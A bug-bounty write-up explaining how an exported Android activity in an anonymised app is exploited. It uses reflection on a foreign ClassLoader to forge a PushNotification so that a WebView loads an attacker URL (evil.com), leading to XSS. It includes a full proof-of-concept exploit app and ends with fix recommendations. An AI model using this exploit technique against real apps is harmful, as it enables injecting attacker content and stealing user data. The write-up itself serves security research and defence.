---
comments: true
title: Popping Android Vulnerabilities From Notification to WebView XSS
date: 2024-10-12T00:00:00.000+07:00
category:
- bugbounty
tags:
- android
- xss
- webview
- intent
private: false
---

![Android](../images/android-vuln.jpg)

### Pre-text
If you’ve always thought hacking Android apps was just about bypassing root detection, SSL pinning, or proxying HTTP requests through Burp Suite to uncover backend bugs, it might be time to shift your mindset. While these are valuable steps in the process, they don't define what Android app vulnerabilities are all about. As someone who’s spent time diving deep into mobile app security, I can tell you that the real vulnerabilities often lie within the Android Java code itself, not just in the backend APIs.

In this post, I’ll walk you through an example of maliciously sending a rich notification, which leads to an XSS vulnerability when processed by a WebView. It’s a prime example of how understanding the inner workings of Android apps can reveal impactful vulnerabilities that might be overlooked otherwise.

### Popping Android Vulnerabilities From Notification to WebView XSS to steal sensitive 

In the last two weeks, I have reported over 20 bugs across multiple Android applications during my bug-hunting sessions. This post details one of the most notable findings: exploiting a WebView via a maliciously crafted intent. The vulnerability involved a combination of an exported activity and unsanitized inputs within the WebView.

Some of the notable findings from my recent bug-hunting session include:

- OAuth token interception
- XSS in WebView exploiting JSBridge for sensitive data
- Sending malicious notifications on behalf of the victim app
- Sending crafted rich notifications that trigger WebView processing, leading to XSS
- Intent redirection

In this post, I'll dive into one of these issues: Sending crafted rich notifications that trigger WebView processing, leading to XSS.


---

### Code Flows

#### 1. **Vulnerable Exported Activity in AndroidManifest.xml**

The `TransitionFlowManager` activity was marked as `exported=true` in the AndroidManifest file, meaning any other application could send an intent to it. The intent action was `victim.PUSH_NOTIFICATION_OPENED`, allowing an attacker to send a crafted intent that triggers the vulnerability.

```xml
<activity
    android:theme="@style/Translucent"
    android:name="com.victim.app.app.base.TransitionFlowManager"
    android:exported="true"
    android:launchMode="singleTop"
    android:windowSoftInputMode="adjustResize|stateAlwaysHidden">
    ...SNIP...
    <intent-filter>
        <action android:name="victim.PUSH_NOTIFICATION_OPENED"/>
    </intent-filter>
    ...SNIP...
</activity>
```

The exported activity allows any other app to send a crafted intent to trigger this activity.

---

#### 2. **Processing the Malicious Intent in `onCreate()`**

When an intent is received, the `onCreate()` method in the `TransitionFlowManager` class processes it and passes the intent to the `PushNotificationsManager.processPushNotification()` method.

```java
@Override // com.victim.app.app.base.BaseActivity
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    this.y.processPushNotification(getIntent(), new AnonymousClass1());
}
```

---

#### 3. **Method `processPushNotification()` in `PushNotificationsManager`**

The `processPushNotification()` method processes the notification data and determines which callback to invoke. In our case, the payload will eventually reach the `onRichNotification()` method.

```java
@Override // com.victim.app.managers.notifications.IPushNotificationsManager
public void processPushNotification(@NotNull Intent intent, @NotNull Callback callback) {
    Intrinsics.checkNotNullParameter(intent, "intent");
    Intrinsics.checkNotNullParameter(callback, "callback");

    PushNotification notification = getNotification(intent);
    if (notification != null) {
        onNotificationOpened(notification);
        if (notification.hasDeepLink()) {
            callback.onDeepLink(notification);
        } else if (notification.isRichNotification()) {
            callback.onRichNotification(notification);
        } else if (!notification.isValidToShow() && !notification isFromFCM()) {
            callback.onNotificationInvalid();
        } else {
            callback.onShowDialog(notification);
        }
    } else {
        callback.onNotificationInvalid();
    }
}
```

Before we can reach the onRichNotification() method, we first need to correctly pass the getNotification(intent) check. This means our intent must be properly formatted according to the app's custom PushNotification object. If we send an intent with just our own class extras, it won’t work because the victim app uses its own Parcelable object for notifications.

This is where the ClassLoader comes into play. Since the app uses a custom parcelable object, we dynamically load the victim app's PushNotification class and create a valid notification object that the app expects. By doing this, we can ensure that our intent is processed successfully, leading to the execution of the onRichNotification() method.

#### 4. The Problematic `getNotification(Intent)` Method

The challenge revolves around the `getNotification()` method in the victim app's `PushNotificationsManager` class. This method extracts the `PushNotification` object from the `Intent` extras. If the extras don't contain the expected `PushNotification` object, the method fails.

Here’s the original victim code from the `PushNotificationsManager.getNotification()` method:

```java
public final PushNotification getNotification(@NotNull Intent intent) {
    Intrinsics.checkNotNullParameter(intent, "intent");
    if (Intrinsics.areEqual(intent.getAction(), ON_NOTIFICATION_OPENED_ACTION)) {
        ComponentName component = intent.getComponent();
        if (StringsKt__StringsJVMKt.equals$default(component == null ? null : component.getPackageName(), this.f6925a.getPackageName(), false, 2, null)) {
            Bundle extras = intent.getExtras();
            return (PushNotification) (extras != null ? extras.get(EXTRA_NOTIFICATION) : null);
        }
    }
    return PushNotificationKt.getNotification(intent);
}
```

In the above code, the `getNotification()` method checks the action of the intent and attempts to retrieve the `PushNotification` object from the intent's extras:

- **Line:** `return (PushNotification) (extras != null ? extras.get(EXTRA_NOTIFICATION) : null);`
  
This line casts the `Parcelable` object retrieved from the extras into a `PushNotification`. This is where the challenge arises: the target app expects the `PushNotification` object to be of its own class, so sending a regular `Parcelable` or serializable data from a malicious app will fail.

The solution to this problem was to dynamically load the victim app's `PushNotification` class using a `ClassLoader`. This allowed me to create an object that the victim app would accept as valid.

Here’s how I achieved that using reflection:

```java
// Load the target app's class dynamically
ClassLoader targetClassLoader = getForeignClassLoader("com.victim.app");
Class<?> pushNotificationClass = targetClassLoader.loadClass("com.victim.app.managers.notifications.PushNotification");

// Get the Builder class from PushNotification
Class<?> builderClass = pushNotificationClass.getDeclaredClasses()[0];

// Create an instance of the Builder using reflection
Constructor<?> builderConstructor = builderClass.getConstructor();
Object builderInstance = builderConstructor.newInstance();

// Use reflection to call the builder methods and build the PushNotification object
Method idMethod = builderClass.getDeclaredMethod("id", String.class);
idMethod.invoke(builderInstance, "123");

Method urlMethod = builderClass.getDeclaredMethod("richUrl", String.class);
urlMethod.invoke(builderInstance, MY_MALICIOUS_URL);

// Call the build method to create the PushNotification object
Method buildMethod = builderClass.getDeclaredMethod("build");
Object pushNotification = buildMethod.invoke(builderInstance);
```

By dynamically loading the target app's class and constructing the `PushNotification` object using reflection, I was able to create an object that the victim app accepted as a valid `PushNotification`. This allowed me to pass the malicious intent successfully.

---

#### 4. **`onRichNotification()` in `TransitionFlowManager`**

When the notification is a rich notification, `onRichNotification()` is invoked. This method prepares the WebView to load the URL provided by the malicious intent.

```java
@Override // com.victim.app.managers.notifications.PushNotificationsManager.Callback
public void onRichNotification(@NotNull PushNotification notification) {
    TransitionFlowManager transitionFlowManager = TransitionFlowManager.this;
    Intent createIntentToRichURL = PushNotificationsManager.INSTANCE.createIntentToRichURL(transitionFlowManager, notification);
    
    if (LoginFragment.isLoginActiviyViewed || victimRioMainActivity.isvictimRiosMainRunning) {
        transitionFlowManager.startActivity(createIntentToRichURL);
        transitionFlowManager.finish();
    } else {
        transitionFlowManager.D.launch(createIntentToRichURL);
    }
}
```

---

#### 5. **Loading the Malicious URL in WebView**

The `PushNotificationsManager.INSTANCE.createIntentToRichURL()` method builds an intent containing the attacker-controlled URL and passes it to the WebView.

```java
@NotNull
public final Intent createIntentToRichURL(@NotNull Context context, @NotNull PushNotification notification) {
    Intrinsics.checkNotNullParameter(context, "context");
    Intrinsics.checkNotNullParameter(notification, "notification");

    Intent intent = new Intent(context, (Class<?>) NotificationWebViewActivity.class);
    intent.putExtra(NotificationWebViewActivity.URL_NOTIFICATION_PARAM, notification.getE());
    intent.putExtra(NotificationWebViewActivity.ID_NOTIFICATION_PARAM, notification.getF6923a());
    return intent;
}
```

`notification.getE()` will read the property `tp_rich_url` and `notification.getF6923a()` will read `tp_id` from the notification object that we sent using the intent and the URL will be loaded into the WebView.

---

### Proof of Concept (PoC)

```java
public class MainActivity extends AppCompatActivity {

    public static final String ON_NOTIFICATION_OPENED_ACTION = "victim.PUSH_NOTIFICATION_OPENED";
    public static final String EXTRA_NOTIFICATION = "victim.PUSH_NOTIFICATION";
    public static final String EXTRA_NOTIFICATION_ID = "tp_id";
    public static final String EXTRA_NOTIFICATION_RICH_URL = "tp_rich_url";
    public static final String MY_MALICIOUS_URL = "https://evil.com";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button triggerButton = findViewById(R.id.triggerButton);

        triggerButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                triggerWebview();
            }
        });
    }

    private void triggerWebview() {
        try {
            Intent intent = new Intent(ON_NOTIFICATION_OPENED_ACTION);
            intent.setComponent(new ComponentName("com.victim.app", "com.victim.app.app.base.TransitionFlowManager"));

            ClassLoader targetClassLoader = getForeignClassLoader("com.victim.app");
            Class<?> pushNotificationClass = targetClassLoader.loadClass("com.victim.app.managers.notifications.PushNotification");

            // Get the Builder class from PushNotification
            Class<?> builderClass = pushNotificationClass.getDeclaredClasses()[0];

            Constructor<?> builderConstructor = builderClass.getConstructor();
            Object builderInstance = builderConstructor.newInstance();

            // Build the PushNotification object using reflection
            Method idMethod = builderClass.getDeclaredMethod("id", String.class);
            idMethod.invoke(builderInstance, "123");

            Method richUrlMethod = builderClass.getDeclaredMethod("richUrl", String.class);
            richUrlMethod.invoke(builderInstance, MY_MALICIOUS_URL);

            Method buildMethod = builderClass.getDeclaredMethod("build");
            Object pushNotification = buildMethod.invoke(builderInstance);

            // Attach the PushNotification to the intent
            Bundle extras = new Bundle();
            extras.putSerializable(EXTRA_NOTIFICATION, (java.io.Serializable) pushNotification);
            intent.putExtras(extras);

            startActivity(intent);

        } catch (Exception e) {
            Log.e("ExploitApp", "Failed to send malicious intent: " + e.getMessage());
        }
    }
}
```
---

### Key Takeaways

---

#### 1. **Android app vulnerabilities go beyond SSL pinning and rooting**:

It’s a common misconception that hacking Android apps is just about bypassing root detection or SSL pinning and looking for backend API bugs. In reality, Android app vulnerabilities are often found in the app’s own Java code, not just in the backend.


#### 2. **Always check for exported activity**:

Exported activities can be an entry point for attackers. Malicious notifications or other apps can exploit vulnerabilities within exported activities. If these activities handle WebViews improperly or lack input validation, they can be vulnerable to serious issues like Cross-Site Scripting (XSS).

#### 3. **ClassLoader attacks enable deeper exploitation**:

Using a dynamic ClassLoader in Android allows an attacker to load the app’s internal classes and create objects that the app will accept as legitimate. This can bypass type checks and allow the attacker to manipulate data or inject malicious payloads into the app.

---

### Recommendations to Fix

---

#### 1. **Validate intents from external sources**:

Always validate intents coming from other apps or external sources. Ensure the package or signature of the sending app is trusted before processing any intent.

#### 2. **Use PendingIntent for restricted access**:

Leverage `PendingIntent` to ensure only authorized apps can trigger sensitive actions within your app.


#### 3. **Enforce URL validation in WebView**:

Only allow URLs from trusted domains to be loaded in WebView. This prevents malicious URLs from injecting harmful scripts.

#### 4. **Exported=false**

If the activity did not have any use cases to be utilized by other application it will always be better to set the `exported` value to `false`

---

### Another Good Read
- https://dphoeniixx.medium.com/arbitrary-code-execution-on-facebook-for-android-through-download-feature-fb6826e33e0f
- https://app.hextree.io/map/android
- https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/